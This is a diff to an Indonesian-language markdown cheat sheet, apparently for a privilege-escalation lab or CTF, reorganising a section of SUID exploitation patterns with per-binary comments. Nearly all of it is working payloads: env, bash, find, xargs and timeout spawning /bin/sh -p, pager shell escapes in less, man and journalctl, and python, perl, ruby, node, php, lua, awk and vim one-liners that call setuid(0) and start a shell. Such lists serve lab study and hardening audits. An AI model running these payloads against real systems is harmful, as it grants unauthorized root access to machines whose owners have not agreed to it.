@@ -89,38 +89,54 @@ Untuk tiap binary → cek di [https://gtfobins.github.io](https://gtfobins.githu
 ## Pola Umum Eksploitasi
 
 ```bash
-./binary -p ...                       # -p mempertahankan euid
-env /bin/sh -p                        # SUID env /usr/bin/env
-bash -p                               # SUID bash /usr/bin/bash
-find . -exec /bin/sh -p \; -quit      # SUID find /usr/bin/find
-awk 'BEGIN{system("/bin/sh")}'        # SUID awk (mawk) /usr/bin/awk
-```
+# env — preserve euid via env
+env /bin/sh -p
 
-Payload lengkap per binary (semua entry di tampilan rentan):
+# bash — flag -p mempertahankan euid
+bash -p
 
-```bash
-# --- shell langsung (flag -p mempertahankan euid=0) ---
-env /bin/sh -p                                   # env
-bash -p                                          # bash
-find . -name x -exec /bin/sh -p \; -quit         # find
-xargs -a /dev/null /bin/sh -p                    # xargs
-time /bin/sh -p                                   # time
-timeout 0 /bin/sh -p                              # timeout
+# find — shell dijalankan dengan euid
+find . -name x -exec /bin/sh -p \; -quit
 
-# --- editor & pager (ketik !/bin/sh -p di dalam pager) ---
-less /etc/profile                                 # less  → !/bin/sh -p
-more /etc/profile                                 # more  → !/bin/sh -p
-man man                                           # man   → !/bin/sh -p
-journalctl                                        # journalctl → !/bin/sh -p
+# xargs — exec shell tanpa argumen
+xargs -a /dev/null /bin/sh -p
 
-# --- interpreter (setuid(0) lalu spawn shell) ---
+# time / timeout — exec shell via wrapper
+time /bin/sh -p
+timeout 0 /bin/sh -p
+
+# less / more — ketik !/bin/sh -p di dalam pager
+less /etc/profile
+more /etc/profile
+
+# man — pager dibuka otomatis, ketik !/bin/sh -p
+man man
+
+# journalctl — output panjang dibuka via pager, ketik !/bin/sh -p
+journalctl
+
+# python3 — setuid(0) lalu spawn shell
 python3 -c 'import os; os.setuid(0); os.execl("/bin/sh","sh","-p")'
+
+# perl — setuid(0) lalu exec shell
 perl -e 'use POSIX (setuid); setuid(0); exec "/bin/sh";'
+
+# ruby — setuid(0) lalu exec shell
 ruby -e 'Process.setuid(0); exec "/bin/sh"'
+
+# node — setuid(0) lalu spawn shell
 node -e 'process.setuid(0); require("child_process").spawn("/bin/sh", {stdio: "inherit"})'
+
+# php — setuid(0) lalu pcntl_exec shell
 php -r 'posix_setuid(0); pcntl_exec("/bin/sh", ["-p"]);'
+
+# lua — exec shell
 lua -e 'os.execute("/bin/sh -p")'
+
+# awk — system() menjalankan command
 awk 'BEGIN{system("/bin/sh -p")}'
+
+# vim — shell escape command-mode
 vim -c ':!/bin/sh -p'
 ```
 
